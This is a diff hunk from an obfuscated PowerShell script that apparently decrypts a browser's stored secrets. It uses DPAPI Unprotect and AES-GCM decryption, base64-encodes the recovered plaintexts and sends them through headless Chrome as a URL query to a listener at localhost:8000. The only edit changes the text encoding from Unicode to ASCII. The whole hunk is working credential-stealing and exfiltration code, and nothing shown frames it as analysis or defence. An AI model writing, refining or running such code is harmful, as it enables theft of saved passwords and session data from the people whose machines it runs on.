@@ -17,5 +17,5 @@ $c=[W]::B($s,5)
 try{$e=$u::Unprotect($c,$n,0)}catch{if($x){$k=$c.length
 $e=[byte[]]::new($k-31)
 $x.Decrypt($c[3..14],$c[15..($k-17)],$c[($k-16)..($k-1)],$e)}}$l+=($e|%{[char]$_})-join''}
-$r=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(($l)-join','))
+$r=[Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes(($l)-join','))
 start-process "chrome" "--headless http://localhost:8000/?$r"
